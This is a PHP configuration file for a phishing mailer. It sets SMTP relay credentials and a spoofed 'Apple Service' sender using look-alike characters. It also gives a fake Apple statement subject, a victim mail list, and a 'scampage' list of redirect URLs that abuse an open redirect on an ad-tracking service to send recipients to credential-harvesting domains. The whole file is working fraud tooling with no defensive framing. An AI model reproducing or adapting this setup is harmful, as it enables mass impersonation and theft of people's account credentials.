<?php

//Regards
date_default_timezone_set('America/Virgin');
$date = date('F d, Y, h:i A T');

/* SMTP SETUP */
$smtp_acc = [
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "admin.manage@ser-vice.business",
        "password" => "Satusatu11"
    ]
];
/* Hapus Tambahkan Source Di Bawah Ini Untuk Menambahkan SMTP atau Mengurangi SMTP  
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "USERNAME",
        "password" => "PASSWORD"
    ],
	
	
*/
/* Features SETUP */	

$gx_setup = [
    "priority"       => 0,
    "userandom"      => 0,
    "sleeptime"      => 1,
    "replacement"    => 1,	
    "filesend"       => 1,
    "userremoveline" => 1,
    "mail_list"      => "file/maillist/hot.txt",
    "fromname"       => "AρρIe Service!",
    "frommail"       => "##randstring##-informationserverlockedupdatenews@##randstring##.id.##randstring##.com",
    "subject"        => "$date.[ Statement Report ] You Have Notification From Apple!",
    "msgfile"        => "file/letter/1.html",
    "filepdf"        => "file/attachment/logo.ico",
    "scampage"       => ["https://travelads.hlserve.com/TravelAdsService/v3/Hotels/TravelAdClickRedirect?trackingData=Cmp-8/ytT8PTNw+DS/a9MeoJDKQvl/xfQ8eXGg8HvD10D7j+wXnODjf4m8Anp1o0F7lhfnsB4OUeESWRm+7EaS0jMxwd9DI6wi4i2nAvvfYLbo5g3XpfYfZNBW5L1o1uCdt6gCmpOD4lEZkFOTHHRDfV19j9teZsg23lWSJs0Aebb9wjj+/zwZ970I15kfSLwnKLkDJp00sdk8FXldf5GFdmg+LfVEyGWoDMG4jugeYoiUzN37QlxOfuXy+dlK6GcOP5K045tdm8d4U4Z0KvjAp3yMfRjv3BsIsDQEPQDB6xa3qxUfXCptZ9XSfm43AAgWAWOa3pkarWNPXO41J8IewV+p28VLip4luiiWVVcN/45RWZuQ7Tt7/hXurTcr7xYwW97d2Nizfv2TapCVL4jSwYEBIMd0ef+wSMO+ly4p7rZ8U5+6kR9Gsu5Erkqyjy/U70Ia1GrCYbREawR3WdQ1tVPXtbig35KZ91kaKqvvMs09VRGEmtSseeykfYt/hYpSGt7hl5k5CpaDT9WMKMG63LhumyEpL4ZNYuC/kCreB0VmDaNUNYjTcjnkL0wRhgsCiCgyDAlj5A6kfCECdLJieoDJlINrexUCmiE8x3fOvDcgE3iyxPX1+uOSHjzFOPBnO+hrYuBLzGTwWsn25rJZY6WZz7T40V12ohGtQ47mNYhWR367tXCRZHPeBlLKJcG0tiCA70YCY33wwJRw9HOUBNy4aZo+Qv5ScX74rlabxrtUoC7WupRwVDs/s1fYhNMVDveagyl8ZW0oPmOphJU82noiv4uMxtHOybiQBKQbP0diZr/bxtYPsyIsKJhlhTWGcK6JwbMVX50ysDMe/VhQmp61JAmv0jUn3CIwuLfNUfgMR3d4359j/PyHZQQb5PHPbLl30ZiVhHSHLivB3LTBAW7hrIlGrQjP3xj7T8nv6aTF4pqIYqYLLBX+AQAqvmZHoB/nHCtAt9CMWpbVTvsSBH+tm3pY08yYU8h+bhf7st0cCNAmgnjhzAwXFjf0CjSBxkhO1CRQrVFzvCs7IDWu8psCtgYl0M6ys2DCD8JJb6de0uQY2wV4qf98eUZPtyJ684y+BDXQ/XT9j8VOHrDxuh7TALlY/KZGHD/WBVEkCNz1OHKqxxgJHrEw==&rank=2&testVersionOverride=13903.56600.1%2C15707.59884.0%2C15466.58705.0%2C16061.58774.0%2C13979.50910.0%2C15940.59972.0%2C15606.59886.0%2C15157.60580.1%2C15993.59296.1%2C14869.56543.0%2C15881.59619.3%2C15608.59498.0%2C15072.57258.2%2C13487.51625.0%2C14567.99990.0&destinationUrl=https%3A%2F%2Fhttps://secure2information-en.ppmail.com.manage-support-accounting.com/main-index.php&exp_pg%3DHSR&candidateHmGuid=b4d7bbc3-bdfb-42fc-843b-bd1d3c2afd1a&beaconIssued=2018-01-09T14:01:03","https://travelads.hlserve.com/TravelAdsService/v3/Hotels/TravelAdClickRedirect?trackingData=Cmp-8/ytT8PTNw+DS/a9MeoJDKQvl/xfQ8eXGg8HvD10D7j+wXnODjf4m8Anp1o0F7lhfnsB4OUeESWRm+7EaS0jMxwd9DI6wi4i2nAvvfYLbo5g3XpfYfZNBW5L1o1uCdt6gCmpOD4lEZkFOTHHRDfV19j9teZsg23lWSJs0Aebb9wjj+/zwZ970I15kfSLwnKLkDJp00sdk8FXldf5GFdmg+LfVEyGWoDMG4jugeYoiUzN37QlxOfuXy+dlK6GcOP5K045tdm8d4U4Z0KvjAp3yMfRjv3BsIsDQEPQDB6xa3qxUfXCptZ9XSfm43AAgWAWOa3pkarWNPXO41J8IewV+p28VLip4luiiWVVcN/45RWZuQ7Tt7/hXurTcr7xYwW97d2Nizfv2TapCVL4jSwYEBIMd0ef+wSMO+ly4p7rZ8U5+6kR9Gsu5Erkqyjy/U70Ia1GrCYbREawR3WdQ1tVPXtbig35KZ91kaKqvvMs09VRGEmtSseeykfYt/hYpSGt7hl5k5CpaDT9WMKMG63LhumyEpL4ZNYuC/kCreB0VmDaNUNYjTcjnkL0wRhgsCiCgyDAlj5A6kfCECdLJieoDJlINrexUCmiE8x3fOvDcgE3iyxPX1+uOSHjzFOPBnO+hrYuBLzGTwWsn25rJZY6WZz7T40V12ohGtQ47mNYhWR367tXCRZHPeBlLKJcG0tiCA70YCY33wwJRw9HOUBNy4aZo+Qv5ScX74rlabxrtUoC7WupRwVDs/s1fYhNMVDveagyl8ZW0oPmOphJU82noiv4uMxtHOybiQBKQbP0diZr/bxtYPsyIsKJhlhTWGcK6JwbMVX50ysDMe/VhQmp61JAmv0jUn3CIwuLfNUfgMR3d4359j/PyHZQQb5PHPbLl30ZiVhHSHLivB3LTBAW7hrIlGrQjP3xj7T8nv6aTF4pqIYqYLLBX+AQAqvmZHoB/nHCtAt9CMWpbVTvsSBH+tm3pY08yYU8h+bhf7st0cCNAmgnjhzAwXFjf0CjSBxkhO1CRQrVFzvCs7IDWu8psCtgYl0M6ys2DCD8JJb6de0uQY2wV4qf98eUZPtyJ684y+BDXQ/XT9j8VOHrDxuh7TALlY/KZGHD/WBVEkCNz1OHKqxxgJHrEw==&rank=2&testVersionOverride=13903.56600.1%2C15707.59884.0%2C15466.58705.0%2C16061.58774.0%2C13979.50910.0%2C15940.59972.0%2C15606.59886.0%2C15157.60580.1%2C15993.59296.1%2C14869.56543.0%2C15881.59619.3%2C15608.59498.0%2C15072.57258.2%2C13487.51625.0%2C14567.99990.0&destinationUrl=https%3A%2F%2Fhttps://secure2information-en.ppmail.com.mails-support-accounting.com/main-index.php&exp_pg%3DHSR&candidateHmGuid=b4d7bbc3-bdfb-42fc-843b-bd1d3c2afd1a&beaconIssued=2018-01-09T14:01:03","https://travelads.hlserve.com/TravelAdsService/v3/Hotels/TravelAdClickRedirect?trackingData=Cmp-8/ytT8PTNw+DS/a9MeoJDKQvl/xfQ8eXGg8HvD10D7j+wXnODjf4m8Anp1o0F7lhfnsB4OUeESWRm+7EaS0jMxwd9DI6wi4i2nAvvfYLbo5g3XpfYfZNBW5L1o1uCdt6gCmpOD4lEZkFOTHHRDfV19j9teZsg23lWSJs0Aebb9wjj+/zwZ970I15kfSLwnKLkDJp00sdk8FXldf5GFdmg+LfVEyGWoDMG4jugeYoiUzN37QlxOfuXy+dlK6GcOP5K045tdm8d4U4Z0KvjAp3yMfRjv3BsIsDQEPQDB6xa3qxUfXCptZ9XSfm43AAgWAWOa3pkarWNPXO41J8IewV+p28VLip4luiiWVVcN/45RWZuQ7Tt7/hXurTcr7xYwW97d2Nizfv2TapCVL4jSwYEBIMd0ef+wSMO+ly4p7rZ8U5+6kR9Gsu5Erkqyjy/U70Ia1GrCYbREawR3WdQ1tVPXtbig35KZ91kaKqvvMs09VRGEmtSseeykfYt/hYpSGt7hl5k5CpaDT9WMKMG63LhumyEpL4ZNYuC/kCreB0VmDaNUNYjTcjnkL0wRhgsCiCgyDAlj5A6kfCECdLJieoDJlINrexUCmiE8x3fOvDcgE3iyxPX1+uOSHjzFOPBnO+hrYuBLzGTwWsn25rJZY6WZz7T40V12ohGtQ47mNYhWR367tXCRZHPeBlLKJcG0tiCA70YCY33wwJRw9HOUBNy4aZo+Qv5ScX74rlabxrtUoC7WupRwVDs/s1fYhNMVDveagyl8ZW0oPmOphJU82noiv4uMxtHOybiQBKQbP0diZr/bxtYPsyIsKJhlhTWGcK6JwbMVX50ysDMe/VhQmp61JAmv0jUn3CIwuLfNUfgMR3d4359j/PyHZQQb5PHPbLl30ZiVhHSHLivB3LTBAW7hrIlGrQjP3xj7T8nv6aTF4pqIYqYLLBX+AQAqvmZHoB/nHCtAt9CMWpbVTvsSBH+tm3pY08yYU8h+bhf7st0cCNAmgnjhzAwXFjf0CjSBxkhO1CRQrVFzvCs7IDWu8psCtgYl0M6ys2DCD8JJb6de0uQY2wV4qf98eUZPtyJ684y+BDXQ/XT9j8VOHrDxuh7TALlY/KZGHD/WBVEkCNz1OHKqxxgJHrEw==&rank=2&testVersionOverride=13903.56600.1%2C15707.59884.0%2C15466.58705.0%2C16061.58774.0%2C13979.50910.0%2C15940.59972.0%2C15606.59886.0%2C15157.60580.1%2C15993.59296.1%2C14869.56543.0%2C15881.59619.3%2C15608.59498.0%2C15072.57258.2%2C13487.51625.0%2C14567.99990.0&destinationUrl=https%3A%2F%2Fsecure2information-en.ppmail.com.cs-reminder-app.com/main-index.php&exp_pg%3DHSR&candidateHmGuid=b4d7bbc3-bdfb-42fc-843b-bd1d3c2afd1a&beaconIssued=2018-01-09T14:01:03","https://secure2information-en.ppmail.com.manage-support-accounting.com/main-index.php"],
];
